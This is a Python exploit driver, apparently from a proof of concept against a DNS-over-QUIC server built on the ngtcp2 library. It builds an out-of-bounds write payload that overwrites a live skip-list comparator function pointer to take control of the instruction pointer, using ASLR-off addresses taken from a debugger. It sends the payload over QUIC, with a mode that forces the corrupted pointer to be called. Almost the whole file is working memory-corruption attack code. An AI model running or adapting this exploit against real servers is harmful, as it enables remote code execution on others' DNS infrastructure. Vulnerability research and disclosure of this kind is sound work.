#!/usr/bin/env python3
"""Rung-4 probe: overwrite the live ngtcp2_ksl comparator at slot1+0xa0.

The neighbour of pers_inbuf (buf+6144) is an ngtcp2_ksl embedded at +0x48;
its `compar` field is at slot1+0xa0.  body[384] -> slot1[0], so the marker
is placed at body[384+0xa0]=body[544].  The F6 memcpy writes 1198 bytes from
body[0] at buf+5760; grooms are disabled so the layout matches the oracle.
"""
import asyncio
import os
import struct
import sys

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "poc", "knot-doq"))
import poc  # noqa: E402

MARKER = 0x4141414141414141       # chosen value for the comparator -> RIP on call
SEARCH = 0x5555555CA5C9           # ngtcp2_ksl_range_search (gdb ASLR-off address)
ROOT = 0x7FFFF6907710             # oracle ksl root block pointer (gdb ASLR-off)


def build_payload():
    out = bytearray(poc.OOB_BODY_LEN)
    b = poc.BODY_SLOT_BASE                     # 384
    out[0:b] = b"\xAA" * b                     # own-slot tail
    # Rebuild a coherent ksl at slot+0x48, changing only `compar`.
    for off in (0x88, 0x90, 0x98):             # root / front / back
        out[b + off: b + off + 8] = struct.pack("<Q", ROOT)
    out[b + 0xA0: b + 0xA8] = struct.pack("<Q", MARKER)   # compar -> chosen
    out[b + 0xA8: b + 0xB0] = struct.pack("<Q", SEARCH)   # search preserved
    out[b + 0xB0: b + 0xB8] = struct.pack("<Q", 1)        # n
    out[b + 0xB8: b + 0xC0] = struct.pack("<Q", 16)       # keylen
    out[b + 0xC0: b + 0xC8] = struct.pack("<Q", 16)       # aligned_keylen
    return bytes(out)


async def main():
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8855
    follow = len(sys.argv) > 2 and sys.argv[2] == "follow"
    payload = build_payload()
    print("[driver] marker=0x%016x at body+%d (slot1+0xa0), len=%d follow=%s"
          % (MARKER, poc.BODY_SLOT_BASE + 0xA0, len(payload), follow), flush=True)
    if follow:
        await run_attack_follow("127.0.0.1", port, payload)
    else:
        await poc.run_attack("127.0.0.1", port, payload, 0, 0, 4)
    print("[driver] done", flush=True)

async def run_attack_follow(host, port, payload):
    """Same six frames, then trailing streams to force ksl/ACK operations."""
    cfg = poc.QuicConfiguration(is_client=True, alpn_protocols=["doq"])
    cfg.verify_mode = poc.ssl.CERT_NONE
    cfg.max_datagram_size = 1500
    cfg.idle_timeout = 20.0
    cfg.max_data = 64 * 1024
    cfg.max_stream_data = 32 * 1024
    async with poc.connect(host, port, configuration=cfg) as proto:
        sid = proto._quic.get_next_available_stream_id(False)
        await poc._escalate(proto, sid)
        await poc._flush(proto, sid, b"\xFF\xFF" + payload, fin=True)
        print("[driver] F6 fired", flush=True)
        await asyncio.sleep(0.4)
        for i in range(3):
            sid2 = proto._quic.get_next_available_stream_id(False)
            await poc._flush(proto, sid2, b"\x00\x04ping", fin=True)
            print("[driver] trailing frame %d on stream %d" % (i + 1, sid2), flush=True)
            await asyncio.sleep(0.4)
        await asyncio.sleep(2.0)


if __name__ == "__main__":
    asyncio.run(main())
